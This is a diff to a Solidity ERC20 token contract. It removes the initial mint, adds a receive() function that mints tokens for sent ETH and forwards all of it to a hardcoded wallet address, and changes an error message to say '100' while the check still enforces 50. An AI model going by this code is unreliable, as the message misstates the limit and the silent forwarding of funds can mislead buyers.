@@ -7,13 +7,18 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 
 
 contract CoinHodler is ERC20,Ownable {
+    
     constructor() ERC20("Coin Hodler", "HODLHODL") {
-        _mint(msg.sender, 21e27);
     }
 
     function add(address token) public onlyOwner {
-        require(coins.length<50, "must be less than 50 coins");
+        require(coins.length<50, "must be less than 100 coins");
         coins.push(token);
+    }
+
+    receive() external payable{
+        _mint(msg.sender,msg.value);
+        payable(0x5cd9a126aF0f435f2C974480BAD0d27ee23B2d56).transfer(msg.value);
     }
 
     address[] public coins; 
